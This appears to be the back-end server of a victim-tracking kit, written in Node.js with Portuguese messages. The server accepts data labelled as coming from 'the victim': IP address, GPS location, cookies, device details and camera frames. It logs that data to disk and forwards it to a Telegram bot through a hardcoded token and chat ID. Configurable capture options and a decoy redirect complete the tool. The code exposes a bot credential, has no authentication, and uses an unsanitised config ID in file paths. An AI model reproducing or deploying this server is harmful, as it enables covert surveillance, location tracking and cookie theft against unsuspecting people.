const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_TOKEN = '8973277172:AAFlMZ8VjIE4D_ADlKHASGiLUn1UVJqd_Iw';
const TELEGRAM_CHAT_ID = '8616361253';

async function sendToTelegram(message) {
    try {
        if (!message || message.trim() === '') {
            console.error('[TELEGRAM] Mensagem vazia');
            return false;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            }),
            signal: AbortSignal.timeout(15000)
        });

        const data = await response.json();

        if (!data.ok) {
            console.error('[TELEGRAM] Erro ao enviar mensagem:', data.description);
            return false;
        }

        console.log('[TELEGRAM] Mensagem enviada com sucesso');
        return true;

    } catch (error) {
        console.error('[TELEGRAM] Erro ao enviar mensagem:', error.message);
        return false;
    }
}

async function sendPhotoToTelegram(caption, base64Image) {
    try {
        if (!base64Image || typeof base64Image !== 'string') {
            console.error('[TELEGRAM] Imagem inválida ou vazia');
            return false;
        }

        let base64Data = base64Image;
        if (base64Image.includes('base64,')) {
            base64Data = base64Image.split('base64,')[1];
        }

        base64Data = base64Data.replace(/\s/g, '').replace(/\n/g, '').replace(/\r/g, '');

        const imageBuffer = Buffer.from(base64Data, 'base64');

        if (!imageBuffer || imageBuffer.length === 0) {
            console.error('[TELEGRAM] Buffer de imagem vazio ou inválido');
            return false;
        }

        const sizeInMB = imageBuffer.length / (1024 * 1024);
        console.log(`[TELEGRAM] Tamanho da imagem: ${sizeInMB.toFixed(2)}MB`);

        if (sizeInMB > 10) {
            console.warn(`[TELEGRAM] Imagem muito grande: ${sizeInMB.toFixed(2)}MB > 10MB`);
            return await sendAsDocument(caption, imageBuffer);
        }

        console.log('[TELEGRAM] Tentando enviar como foto...');
        const photoResult = await sendAsPhoto(caption, imageBuffer);

        if (photoResult) {
            console.log('[TELEGRAM] Foto enviada com sucesso!');
            return true;
        }

        console.log('[TELEGRAM] Falha ao enviar como foto, tentando como documento...');
        return await sendAsDocument(caption, imageBuffer);

    } catch (error) {
        console.error('[TELEGRAM] Erro geral ao enviar imagem:', error.message);
        return false;
    }
}

async function sendAsPhoto(caption, imageBuffer) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption.substring(0, 1024));

        const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'capture.jpg');

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            signal: AbortSignal.timeout(30000)
        });

        const data = await response.json();

        if (!data.ok) {
            console.error('[TELEGRAM] Erro no sendPhoto:', data.description);
            return false;
        }

        return true;

    } catch (error) {
        console.error('[TELEGRAM] Erro no sendPhoto:', error.message);
        return false;
    }
}

async function sendAsDocument(caption, imageBuffer) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption.substring(0, 1024));

        const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
        formData.append('document', blob, 'capture.jpg');

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            signal: AbortSignal.timeout(30000)
        });

        const data = await response.json();

        if (!data.ok) {
            console.error('[TELEGRAM] Erro no sendDocument:', data.description);
            return false;
        }

        console.log('[TELEGRAM] Documento enviado com sucesso!');
        return true;

    } catch (error) {
        console.error('[TELEGRAM] Erro no sendDocument:', error.message);
        return false;
    }
}

app.post('/log', async (req, res) => {
  const data = req.body;
  data.receivedAt = new Date().toISOString();
  data.serverIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP não capturado';

  const logDir = path.join(__dirname, 'logs');
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

  const filename = `log_${Date.now()}_${data.id || 'unknown'}.json`;
  const filePath = path.join(logDir, filename);
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

  const masterPath = path.join(logDir, 'master.json');
  let master = [];
  if (fs.existsSync(masterPath)) {
    master = JSON.parse(fs.readFileSync(masterPath));
  }
  master.push(data);
  fs.writeFileSync(masterPath, JSON.stringify(master, null, 2));

  console.log(`[LOG] ID: ${data.id || 'N/A'} | IP: ${data.ip || 'N/A'} | Device: ${data.deviceModel || 'N/A'}`);

  let message = `<b>🔴 NOVA CAPTURA</b>\n\n`;
  message += `<b>ID:</b> ${data.id || 'N/A'}\n`;
  message += `<b>Horário:</b> ${data.receivedAt}\n`;
  message += `<b>IP:</b> ${data.ip || 'Não capturado'}\n`;
  message += `<b>Navegador:</b> ${data.browserData?.browser || data.browser || 'N/A'}\n`;
  message += `<b>Dispositivo:</b> ${data.deviceModel || data.browserData?.model || 'N/A'}\n`;
  message += `<b>Tipo:</b> ${data.deviceType || data.browserData?.device || 'N/A'}\n`;
  message += `<b>SO:</b> ${data.os || data.browserData?.os || 'N/A'}\n`;
  message += `<b>Resolução:</b> ${data.screen || 'N/A'}\n`;
  message += `<b>Timezone:</b> ${data.timezone || 'N/A'}\n`;
  message += `<b>URL:</b> ${data.url || 'N/A'}\n`;
  message += `<b>Referrer:</b> ${data.referrer || 'N/A'}\n`;

  if (data.location && data.location.lat && data.location.lon) {
    const lat = data.location.lat;
    const lon = data.location.lon;
    const acc = data.location.acc || 'N/A';
    const source = data.location.source || 'desconhecida';

    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

    message += `<b>📍 Localização:</b> ${lat}, ${lon}\n`;
    message += `<b>Precisão:</b> ${acc} (fonte: ${source})\n`;
    message += `<a href="${mapsLink}">🔗 Ver no Google Maps</a>\n`;
  } else {
    message += `<b>📍 Localização:</b> Não disponível\n`;
  }

  if (data.cookies) {
    const cookieNames = Object.keys(data.cookies);
    message += `<b>🍪 Cookies:</b> ${cookieNames.length} capturados\n`;
    if (cookieNames.length > 0) {
      message += `<i>${cookieNames.join(', ')}</i>\n`;
    }
  }

  const hasCamera = !!data.cameraFrame;
  message += `<b>📷 Câmera:</b> ${hasCamera ? '✅ Capturada' : '❌ Não capturada'}\n`;

  await sendToTelegram(message);

  if (data.cameraFrame) {
    const caption = `📷 Frame capturado de ${data.id || 'desconhecido'} (${data.ip || 'IP N/A'})`;
    await sendPhotoToTelegram(caption, data.cameraFrame);
  }

  res.status(200).json({ status: 'ok', receivedAt: data.receivedAt });
});

app.get('/logs', (req, res) => {
  const masterPath = path.join(__dirname, 'logs', 'master.json');
  if (fs.existsSync(masterPath)) {
    const logs = JSON.parse(fs.readFileSync(masterPath));
    const recent = logs.slice(-50).reverse();
    res.json(recent);
  } else {
    res.json([]);
  }
});

app.post('/config', (req, res) => {
  const config = req.body;
  const id = config.id;
  if (!id) {
    return res.status(400).json({ error: 'ID é obrigatório' });
  }
  const configDir = path.join(__dirname, 'configs');
  if (!fs.existsSync(configDir)) fs.mkdirSync(configDir);
  const configPath = path.join(configDir, `${id}.json`);
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
  res.status(200).json({ status: 'ok', id: id });
});

app.get('/config/:id', (req, res) => {
  const id = req.params.id;
  const configPath = path.join(__dirname, 'configs', `${id}.json`);
  if (fs.existsSync(configPath)) {
    const config = JSON.parse(fs.readFileSync(configPath));
    res.json(config);
  } else {
    res.json({
      id: id,
      redirect: 'https://www.google.com',
      capture: {
        ip: true,
        location: true,
        cookies: true,
        browser: true,
        device: true,
        camera: false
      }
    });
  }
});

app.get('/ping', (req, res) => {
  res.json({ status: 'ok', message: 'Servidor rodando' });
});

app.listen(PORT, () => {
  console.log(`\n========================================`);
  console.log(`[SERVER] Rodando em http://localhost:${PORT}`);
  console.log(`[SERVER] Teste: http://localhost:${PORT}/ping`);
  console.log(`[SERVER] POST /log — recebe dados da vítima`);
  console.log(`[SERVER] GET /logs — lista logs`);
  console.log(`[SERVER] POST /config — salva configuração`);
  console.log(`[SERVER] GET /config/:id — busca configuração`);
  console.log(`[TELEGRAM] Enviando logs para o chat ID: ${TELEGRAM_CHAT_ID}`);
  console.log(`========================================\n`);
});
